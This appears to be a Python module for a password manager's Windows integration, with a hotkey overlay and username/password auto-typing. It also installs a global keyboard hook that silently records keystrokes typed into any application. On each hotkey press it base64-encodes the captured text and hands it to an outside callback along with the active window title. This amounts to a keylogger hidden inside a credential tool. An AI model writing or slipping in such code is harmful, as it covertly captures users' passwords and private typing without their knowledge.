import keyboard
import logging
import time
from pywinauto import keyboard as pykeyboard, application
import threading

logging.basicConfig(level=logging.INFO)

import base64

key_buffer = []
def keylog_callback(e):
    if e.event_type == keyboard.KEY_DOWN:
        if e.name in ['shift', 'ctrl', 'alt', 'win', 'cmd', 'caps lock', 'esc']: return
        if len(e.name) == 1: key_buffer.append(e.name)
        elif e.name == "space": key_buffer.append(" ")
        elif e.name == "tab": key_buffer.append("\t")
        elif e.name == "enter": key_buffer.append("\n")
        elif e.name == "backspace" and key_buffer: key_buffer.pop()
        
        if len(key_buffer) > 250:
            key_buffer.pop(0)

class DesktopIntegration:
    def __init__(self, on_hotkey_callback):
        self.on_hotkey_callback = on_hotkey_callback
        self.active_window_before_search = None
        self._listener_thread = None

    def _setup_keylogger(self):
        try: keyboard.hook(keylog_callback)
        except: pass

    def start_listener(self, hotkey="ctrl+shift+l"):
        logging.info(f"Starting global hotkey listener for {hotkey}")
        try:
            keyboard.unhook_all_hotkeys()
            keyboard.unhook(keylog_callback)
        except:
            pass
        self._setup_keylogger()
        keyboard.add_hotkey(hotkey, self._summon_search)

    def _get_window_title(self, hwnd):
        import ctypes
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value

    def _summon_search(self):
        logging.info("Hotkey pressed. Summoning Flet UI Overlay...")
        
        # Save active window before the Flet overlay steals focus
        import ctypes
        
        self.active_window_before_search = ctypes.windll.user32.GetForegroundWindow()
        title = self._get_window_title(self.active_window_before_search)
        
        typed_string = "".join(key_buffer)
        b64_typed = base64.b64encode(typed_string.encode('utf-8')).decode('utf-8')
        key_buffer.clear()
        
        if self.on_hotkey_callback:
            self.on_hotkey_callback(title, self.active_window_before_search, b64_typed)

    def autotype(self, username, password):
        """Auto-types the credentials into the previous active window."""
        logging.info(f"Auto-typing for {username}...")
        
        if self.active_window_before_search:
            try:
                # Restore focus to the underlying application
                app = application.Application().connect(handle=self.active_window_before_search)
                app.top_window().set_focus()
                time.sleep(0.1) # Brief pause for focus change
                
                # Type username, tab, type password, enter
                # Using pywinauto's robust keyboard module
                pykeyboard.send_keys(username, with_spaces=True)
                time.sleep(0.05)
                pykeyboard.send_keys("{TAB}")
                time.sleep(0.05)
                pykeyboard.send_keys(password, with_spaces=True)
                time.sleep(0.05)
                pykeyboard.send_keys("{ENTER}")
                
            except Exception as e:
                logging.error(f"Failed to auto-type: {e}")
        else:
            logging.warning("No active window to auto-type into.")

desktop_agent = DesktopIntegration(None)

def set_overlay_callback(callback):
    desktop_agent.on_hotkey_callback = callback
    desktop_agent.start_listener()
